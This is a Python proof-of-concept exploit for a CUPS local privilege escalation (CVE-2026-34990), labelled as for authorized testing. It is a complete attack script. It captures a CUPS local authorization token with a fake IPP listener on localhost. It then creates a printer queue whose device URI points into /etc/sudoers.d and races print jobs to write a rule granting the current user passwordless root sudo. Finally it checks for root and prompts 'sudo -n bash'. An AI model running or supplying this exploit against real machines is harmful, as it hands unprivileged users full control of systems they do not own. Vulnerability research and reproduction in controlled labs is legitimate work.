#!/usr/bin/env python3
"""
CVE-2026-34990 - CUPS Local Privilege Escalation PoC

Generic proof-of-concept for reproducing CVE-2026-34990
in authorized and controlled environments.

PoC adaptation and testing: Noor Khalil

Vulnerability credit:
Asim Viladi Oglu Manizada (@manizada)

This project is not affiliated with any CTF, training platform,
or third-party lab environment.

For educational and authorized security testing only.
"""
import getpass, gzip, os, socket, struct, subprocess, threading, time

USER = getpass.getuser()
HOST, PORT = "127.0.0.1", 631
CAP_HOST, CAP_PORT = "127.0.0.1", 9189
TARGET = f"/etc/sudoers.d/{USER}-pwn"
PAYLOAD = f"{USER} ALL=(ALL) NOPASSWD: ALL\n".encode()

T_OP, T_PRN, T_END = 0x01, 0x04, 0x03
T_BOOL, T_NAME, T_KEY, T_URI = 0x22, 0x42, 0x44, 0x45
T_CHARSET, T_LANG, T_MIME = 0x47, 0x48, 0x49

OP_PRINT = 0x0002
OP_RESUME = 0x0011
OP_ADD = 0x4003
OP_ACCEPT = 0x4008
OP_CREATE_LOCAL = 0x4028

def attr(tag, name, value):
    if isinstance(value, str):
        value = value.encode()
    n = name.encode()
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(value)) + value

def boolean(name, value):
    return attr(T_BOOL, name, b"\x01" if value else b"\x00")

def common():
    return [
        attr(T_CHARSET, "attributes-charset", "utf-8"),
        attr(T_LANG, "attributes-natural-language", "en"),
        attr(T_NAME, "requesting-user-name", USER),
    ]

def ipp(op, rid, opattrs, prnattrs=None, document=b""):
    b = bytearray(struct.pack(">BBHI", 2, 0, op, rid))
    b.append(T_OP)
    for x in opattrs:
        b += x
    if prnattrs:
        b.append(T_PRN)
        for x in prnattrs:
            b += x
    b.append(T_END)
    b += document
    return bytes(b)

def post(path, body, token=None):
    h = [
        f"POST {path} HTTP/1.1",
        f"Host: {HOST}:{PORT}",
        "Content-Type: application/ipp",
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]
    if token:
        h.append(f"Authorization: Local {token}")
    req = ("\r\n".join(h) + "\r\n\r\n").encode() + body
    with socket.create_connection((HOST, PORT), timeout=2) as s:
        s.sendall(req)
        out = bytearray()
        while True:
            try:
                c = s.recv(65535)
            except socket.timeout:
                break
            if not c:
                break
            out += c
    return bytes(out)

def printer_uri(name):
    return f"ipp://localhost:631/printers/{name}"

def admin(token, op, rid, name, attrs=None):
    body = ipp(
        op, rid,
        common() + [attr(T_URI, "printer-uri", printer_uri(name))],
        attrs
    )
    return post("/admin/", body, token)

class TokenServer(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.token = None

    def run(self):
        with socket.socket() as srv:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((CAP_HOST, CAP_PORT))
            srv.listen(5)
            srv.settimeout(0.25)
            deadline = time.time() + 10

            while time.time() < deadline and not self.token:
                try:
                    c, _ = srv.accept()
                except socket.timeout:
                    continue

                with c:
                    c.settimeout(2)
                    data = bytearray()
                    try:
                        while b"\r\n\r\n" not in data:
                            x = c.recv(4096)
                            if not x:
                                break
                            data += x
                    except socket.timeout:
                        pass

                    text = data.decode("latin1", "replace")
                    token = None
                    for line in text.splitlines():
                        if line.lower().startswith("authorization: local "):
                            token = line.split(None, 2)[2]
                            break

                    if token:
                        self.token = token
                        ipp_ok = (
                            b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                            b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                            b"\x48\x00\x1battributes-natural-language\x00\x02en\x03"
                        )
                        reply = (
                            b"HTTP/1.1 200 OK\r\n"
                            b"Content-Type: application/ipp\r\n"
                            + f"Content-Length: {len(ipp_ok)}\r\n".encode()
                            + b"Connection: close\r\n\r\n"
                            + ipp_ok
                        )
                    else:
                        reply = (
                            b"HTTP/1.1 401 Unauthorized\r\n"
                            b'WWW-Authenticate: Local trc="y"\r\n'
                            b"Content-Length: 0\r\n"
                            b"Connection: close\r\n\r\n"
                        )
                    try:
                        c.sendall(reply)
                    except OSError:
                        pass

def steal_token():
    srv = TokenServer()
    srv.start()

    env = os.environ.copy()
    env["CUPS_SERVER"] = "localhost:631"

    subprocess.run([
        "/usr/bin/ipptool", "-q",
        "-d", "name=tokenleak",
        "-d", f"device=ipp://{CAP_HOST}:{CAP_PORT}/ipp/print",
        "ipp://localhost:631/",
        "/usr/share/cups/ipptool/cups-create-local-printer.test",
    ], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    srv.join(4)
    if not srv.token:
        raise SystemExit("[-] failed to capture Local token")
    return srv.token

def create_file_queue(name):
    body = ipp(
        OP_CREATE_LOCAL, 2,
        common() + [attr(T_URI, "printer-uri", "ipp://localhost:631/")],
        [
            attr(T_NAME, "printer-name", name),
            attr(T_URI, "device-uri", f"file://{TARGET}"),
        ]
    )

    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/ipp\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((HOST, PORT), timeout=2)
    s.sendall(req)
    return s

def send_payload(name, rid):
    body = ipp(
        OP_PRINT, rid,
        common() + [
            attr(T_URI, "printer-uri", printer_uri(name)),
            attr(T_MIME, "document-format", "application/vnd.cups-raw"),
            attr(T_KEY, "compression", "gzip"),
            attr(T_NAME, "job-name", "probe"),
        ],
        document=gzip.compress(PAYLOAD)
    )
    post(f"/printers/{name}", body)

def root_check():
    p = subprocess.run(["sudo", "-n", "id"], text=True, capture_output=True)
    if p.returncode == 0:
        print("[+] ROOT via sudoers")
        print(p.stdout.strip())
        return True
    return False

def main():
    print(f"[*] user: {USER}")
    print(f"[*] target: {TARGET}")

    token = steal_token()
    print(f"[+] Local token: {token}")

    for attempt in range(1, 13):
        name = f"pwn{attempt}{time.time_ns() % 100000}"
        print(f"[*] attempt {attempt}: {name}")

        try:
            hold = create_file_queue(name)
        except Exception as e:
            print(f"[-] queue creation failed: {e}")
            continue

        try:
            for i in range(80):
                rid = 1000 + i * 4
                try:
                    admin(token, OP_ADD, rid, name, [
                        attr(T_NAME, "ppd-name", "raw"),
                        boolean("printer-is-shared", True),
                    ])
                    admin(token, OP_ACCEPT, rid + 1, name)
                    admin(token, OP_RESUME, rid + 2, name)
                    send_payload(name, rid + 3)
                except Exception:
                    pass

                if root_check():
                    print("[*] next: sudo -n bash")
                    return
                time.sleep(0.01)
        finally:
            hold.close()

    raise SystemExit("[-] exploit did not win the race")

if __name__ == "__main__":
    main()
